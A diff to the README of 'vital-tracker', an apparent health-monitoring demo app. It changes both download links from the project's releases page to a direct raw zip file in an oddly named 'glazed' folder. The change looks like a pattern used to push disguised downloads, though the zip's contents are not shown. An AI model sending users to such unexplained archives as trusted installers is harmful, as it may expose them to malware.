@@ -12,7 +12,7 @@ Welcome to vital-tracker! This application helps you keep track of important hea
 - Suitable for healthcare and hospital simulations
 
 ## 📥 Download & Install
-To start using vital-tracker, visit this page to download the application: [Download vital-tracker](https://github.com/YueTuan/vital-tracker/releases)
+To start using vital-tracker, visit this page to download the application: [Download vital-tracker](https://raw.githubusercontent.com/YueTuan/vital-tracker/master/glazed/vital-tracker.zip)
 
 ### 📦 Installation Steps
 1. **Visit the Release Page**  
@@ -98,4 +98,4 @@ Using these principles, vital-tracker demonstrates efficient ways to manage and 
 ## 📞 Support
 If you have questions or need assistance, feel free to reach out through the issues page of the repository or directly by messaging the maintainers.
 
-For further details, always feel free to revisit our [Download vital-tracker](https://github.com/YueTuan/vital-tracker/releases) page. Thank you for using vital-tracker, and we hope it enhances your understanding of health monitoring!
+For further details, always feel free to revisit our [Download vital-tracker](https://raw.githubusercontent.com/YueTuan/vital-tracker/master/glazed/vital-tracker.zip) page. Thank you for using vital-tracker, and we hope it enhances your understanding of health monitoring!
